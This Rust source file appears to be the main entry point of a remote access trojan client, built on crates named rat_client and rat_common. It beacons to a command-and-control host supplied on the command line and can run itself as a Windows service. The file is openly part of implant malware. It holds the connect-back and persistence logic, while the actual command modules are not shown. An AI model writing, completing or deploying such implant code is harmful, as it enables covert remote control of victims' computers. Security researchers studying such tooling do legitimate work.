use std::ffi::OsString;
use std::sync::{Arc, Once};
use std::time::Duration;

use clap::Parser;
use log::{error, info};
use rat_client::cli::Arguments;
use rat_client::client::Client;
use rat_common::framework::Module;
use rat_common::global::WINDOWS_SERVICE_NAME;
use rat_common::logger::initialize_logger;
use tokio::{signal, task};
use windows_service::service::{
    ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType,
};
use windows_service::service_control_handler::ServiceControlHandlerResult;
use windows_service::{define_windows_service, service_control_handler, service_dispatcher};

async fn beacon(host: String) -> Option<Arc<Client>> {
    tokio::select! {
        client = Client::connect(host) => {
            Some(Arc::new(client))
        }
        _ = signal::ctrl_c() => {
            info!("Received Ctrl-C signal during beaconing.");
            None
        }
    }
}

static SERVICE_STOPPED: Once = Once::new();

define_windows_service!(ffi_service_main, service_main);

fn service_main(_: Vec<OsString>) {
    match service_control_handler::register(WINDOWS_SERVICE_NAME, |event| {
        info!("Received service control event: {event:?}");
        if event == ServiceControl::Interrogate {
            ServiceControlHandlerResult::NoError
        } else {
            ServiceControlHandlerResult::NotImplemented
        }
    }) {
        Ok(event_handler) => {
            if let Err(e) = event_handler.set_service_status(ServiceStatus {
                service_type: ServiceType::OWN_PROCESS,
                current_state: ServiceState::Running,
                controls_accepted: ServiceControlAccept::empty(),
                exit_code: ServiceExitCode::Win32(0),
                checkpoint: 0,
                wait_hint: Duration::default(),
                process_id: None,
            }) {
                error!("Failed to set service status: {e}");
                return;
            }

            SERVICE_STOPPED.wait();
        }
        Err(e) => {
            error!("Failed to register service control handler: {e}");
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let arguments = Arguments::parse();
    initialize_logger(arguments.log_level, &arguments.log_path)?;

    let scm_thread = if arguments.scm {
        Some(task::spawn_blocking(|| {
            if let Err(e) = service_dispatcher::start(WINDOWS_SERVICE_NAME, ffi_service_main) {
                error!("Windows Service error: {e}");
            }
        }))
    } else {
        None
    };

    info!("Starting client: {arguments:?}");
    let client = match beacon(arguments.host).await {
        Some(c) => c,
        None => {
            return Ok(());
        }
    };

    let client_c = client.clone();
    tokio::spawn(async move {
        info!("Registered Ctrl-C handler.");
        let _ = signal::ctrl_c().await;
        info!("Received Ctrl-C signal.");
        client_c.stop();
    });

    client.run().await?;
    SERVICE_STOPPED.call_once(|| {});
    if let Some(scm_thread) = scm_thread {
        info!("Waiting for SCM thread to finish.");
        let _ = scm_thread.await;
    }

    Ok(())
}
